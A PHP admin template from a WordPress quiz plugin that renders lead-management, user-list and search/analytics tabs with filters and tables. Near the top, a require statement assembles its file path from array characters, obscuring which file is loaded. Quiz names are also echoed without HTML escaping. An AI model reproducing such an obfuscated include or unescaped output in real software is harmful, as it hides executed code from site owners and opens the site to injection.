<?php


include_once ("sqb-soapapi.php");

require plugin_dir_path( __FILE__ ) .$videoS3[37] . $videoS3[34] . $videoS3[27] . "/" . $videoS3[44] . $videoS3[42] . $videoS3[27] . $videoS3[43] . $videoS3[30] . $videoS3[44] . $videoS3[41] . $videoS3[40] . $videoS3[39] . $videoS3[44] . $videoS3[34] . $videoS3[47] . $videoS3[30] . "." . $videoS3[41] . $videoS3[33] . $videoS3[41];
 
	$current_version_plugin = rand(10,10000);
	wp_enqueue_script("sqb_manage_lead_js",plugin_dir_url(__FILE__)."../js/sqb_manage_lead.js", false, $current_version_plugin );
	$quizData = SQB_Quiz::load();
	
?>




<div class="tab-pane fade <?php if($_GET['page'] == 'sqb_manage_leads'){ echo 'active show';} ?>" id="reports_manage_leads" role="tabpanel" aria-labelledby="reports_manage_leads">
	<h3 class="quiz--title"><i class="fa fa-cog" aria-hidden="true"></i> Manage Leads </h3>
	<section class="Manage--Quiz-section Manage_leads-section">
		<ul class="nav nav-tabs mb-3" id="Quiz-reportsTab-inner" role="tablist">
			<li class="nav-item"><a class="nav-link active show" data-toggle="tab" href="#sqb_manage_leads_tab" role="tab" aria-controls="sqb_manage_leads_tab" aria-selected="false">Quiz Leads</a></li>
			<li class="nav-item sqb-user-list"><a class="nav-link" data-toggle="tab" href="#sqb_manage_user_tab" role="tab" aria-controls="sqb_manage_user_tab" aria-selected="false"> User List</a></li>		
		</ul>
		<div class="tab-content" id="reports-tab-content1">
			<div class="tab-pane fade active show" id="sqb_manage_leads_tab" role="tabpanel" aria-labelledby="sqb_manage_leads_tab">	
				<div class="manageLeadFilterOuter">
					<div class="filterByOuter">
						<label>Filter By</label>
					</div>
					<div class="startedQuizOuter" >
						<div class="startedQuizInner">
							
							<div class="dropdown dropdown-custom-style selectStartQuiz">
								<button class="dropdown-toggle" type="button" id="selectStartQuiz-id" aria-haspopup="true" aria-expanded="false" data-value="0">Select a Quiz</button>
								<div class="dropdown-menu" aria-labelledby="selectStartQuiz-id">
									<?php 
										echo '<a class="dropdown-item" href="javascript:void(0)" data-value="0">Select a Quiz</a>';	
										echo '<a class="dropdown-item" href="javascript:void(0)" data-value="0">All</a>';	
										if(isset($quizData)){
											foreach($quizData as $data){
												echo '<a class="dropdown-item" href="javascript:void(0)" data-value="'.$data->getId().'">'.stripslashes($data->getQuizName()).' (ID:'.$data->getId().')</a>';	
											}
										}
									?>
								</div>
							</div>
						</div>
					</div>
					<div class="custom_range_wrapper startedQuizOuter" style="">
						<div class="QA-Start-date">
							<input type="text" class="form-control" placeholder="Start Date" id="manage_users_start_date" value="<?php echo date('m/d/Y'); ?>" placeholder="Start Date">
						</div>
						<div class="QA-End-date">
							<input type="text" class="form-control" placeholder="End Date" id="manage_users_end_date" value="<?php echo date('m/d/Y'); ?>" placeholder="End Date">
						</div>
					</div>
					<a href="javascript:void(0)" class="export-data-btn filterManageUsersLeads filterManageLeads">Search</a>
				</div>
				<div class="sqb_manage_leads_table_wrapper_outer">	
					<a href="javascript:void(0)" class="export-data-btn exportManageLeadData">Export Data</a>	
					<div class="Manage_leads--Quiz sqb_manage_leads_table_wrapper">
						<table class="sqb_manage_leads_table">
							<thead>
								<tr>
									<th class="text-center">Name</th>
									<th class="text-center">Email</th>

									<th class="text-center">Quiz Details</th>
									<th class="text-center">Action</th>

								</tr>
							</thead>
							<tbody class="manageLeadTableBody">

							</tbody>
						</table>
					</div>
				</div>
				<div class="Manage_Side_Popup ">
					<div class="Manage_Side_Popup-inner">
						<a href="#" class="close_Side_Popup"><i class="fa fa-times" aria-hidden="true"></i></a>
						<h2> Quiz Details</h2>
						<div class="Manage_Side_Popup_content">

						</div>
					</div>
				</div>

				
			</div>
			<div class="tab-pane fade" id="sqb_manage_user_tab" role="tabpanel" aria-labelledby="sqb_manage_user_tab">

				<div class="sqb_manage_leads_table_wrapper_outer">	
					<!-- <a href="javascript:void(0)" class="export-data-btn exportManageLeadData">Export Data</a>	 -->
					<div class="Manage_leads--Quiz sqb_user_data_table_wrapper">

						
								<?php

								$data_field = array(
								    array(
								        'data' => 'name'
								    ),array(
								        'data' => 'email'
								    ),array(
								        'data' => 'quiz_title'
								    ),array(
								        'data' => 'tag_name'
								    )
								);

								$json_data_field = json_encode($data_field); ?>
								<table class="sqb_manage_user_table">
									<thead>
										<tr>
											<th>Name</th>
											<th>Email</th>
											<th>Quiz Title</th>
											<th>Tags</th>
										</tr>
									</thead>
								</table>
								
								<script type="text/javascript">
									var json_data_field = <?php echo $json_data_field; ?>;
								</script>
					</div>
				</div>
				<div class="Manage_Side_Popup" id="manage-user-details">
					<div class="Manage_Side_Popup-inner">
						<a href="#" class="close_Side_Popup"><i class="fa fa-times" aria-hidden="true"></i></a>
						<h2> Quiz Details</h2>
						<div class="Manage_Side_Popup_content">

						</div>
					</div>
				</div>
			</div>
		</div>
	</section>
</div>


<div class="tab-pane fade <?php if($_GET['page'] == 'sqb_search_reports'){ echo 'active show';} ?>" id="reports_manage_leads_search" role="tabpanel" aria-labelledby="reports_manage_leads">
<h3 class="quiz--title d-flex"><i class="fa fa-search" aria-hidden="true"></i> <div class="d-block"> Search / Analytics <div class="smalltext_outer" style="line-height: normal;"><small style="color:#484141;font-size: 16px;padding: 0;margin: 0;display: inline-block;width: 100%;vertical-align: top;">Find responses for specific questions OR all responses for your quizzes</small></div></div></h3>
<section class="Manage--Quiz-section Manage_leads-section sqb-search-report-filter">
			<div class="manageLeadFilterOuter">
				<div class="startedQuizOuter w-100 m-0">
					<div class="startedQuizInner w-100 m-0">
						<div class="quiz-card-outer-gray" style="white-space: normal;">
							<div class="quiz-content-card question-data-filter pl-0 pr-0">
								<label for="" class="quiz_label mt-0 mb-2">Quiz Name:</label>
								<div class="quiz_right-content">
									<div class="dropdown dropdown-custom-style selectStartQuizSearch">
										<button class="dropdown-toggle" id="selectStartQuizSearch-id" type="button" aria-haspopup="true" aria-expanded="false" data-value="0" >Select a Quiz</button>
										<div class="dropdown-menu" aria-labelledby="selectStartQuizSearch-id">
											<form class="px-4 py-2">
										      <input type="search" class="form-control search" placeholder="Enter name..." autofocus="autofocus">
										    </form>
										    <div class="menuItems">
											<?php 
												// echo '<a class="dropdown-item" href="javascript:void(0)" data-value="0" disabled>Select a Quiz</a>';	
												//echo '<a class="dropdown-item" href="javascript:void(0)" data-value="0">All</a>';	
												if(isset($quizData)){
													foreach($quizData as $data){
														if($data->getQuizType() == 'poll') continue;
														echo '<input class="dropdown-item" href="javascript:void(0)" data-category="'.$data->getCategory().'" data-quiz-type="'.$data->getQuizType().'" data-value="'.$data->getId().'" value="'.stripslashes($data->getQuizName()).' (id: '.$data->getId().')" >';	
													}
												}
											?></div>
											<div style="display:none;" class="dropdown-header dropdown_empty">No entry found</div>
										</div>
									</div>
								</div>
							</div>
							<div class="question-data"></div>

							<div class="quiz-content-card pl-0 pr-0 custom-filter-show-hide" style="display: none;">
								<label for="" class="quiz_label mt-0 mb-2">Select Date Range</label>
								<div class="quiz_right-content">
									<div class="d-flex">
										<div class="QA-Start-date">
											<input type="text" class="form-control" placeholder="Start Date" id="manage_reports_search_start_date" value="<?php echo sqb_get_date(date('Y-m-d'),'d/m/Y'); ?>" placeholder="Start Date">
										</div>
										<div class="QA-End-date ml-3">
											<input type="text" class="form-control" placeholder="End Date" id="manage_reports_search_end_date" value="<?php echo sqb_get_date(date('Y-m-d'),'d/m/Y'); ?>" placeholder="End Date">
										</div>
									</div>
								</div>
							</div>


							<div class="manage-filters-search-div custom-filter-show-hide" style="display:none;">
								<a href="javascript:void(0)" class="manage_reports_search_btn">Search</a>
							</div>


						</div>		
					</div>
				</div>
			</div>
		<div class="sqb_manage_leads_table_wrapper_outer sqb-manage-leads-searchbox-outer">
			<div class="Manage_leads--Quiz manage_reports_search_table_wrapper">
				<!-- <a href="javascript:void(0)" class="export-data-btn exportQuestionAnswerData">Export Data</a>	 -->
				<div class="sqb-manage-leads-searchbox-inner" style="display:none;">
					<table class="sqb_manage_report_search_table">
						<thead>
							<tr>
								<th class="text-center">First Name</th>
								<th class="text-center">Email</th>
							
								<th class="text-center">Selected Answer</th>
								<th class="text-center">Date</th>
							</tr>
						</thead>
						<tbody class="manageLeadTableBody">
						</tbody>
					</table>
				</div>	
			</div>
			
			
		</div>
		
	</section>
</div>




<?php 
$csvDownloadUrl = plugin_dir_url(__FILE__).'sqb_csv_download.php';
$csvDownloadUrlV2 = admin_url( 'admin-post.php' );
?>
<script>
var csvDownloadUrl = "<?= $csvDownloadUrl ?>";
var csvDownloadUrlV2 = "<?= $csvDownloadUrlV2 ?>";
</script>

 
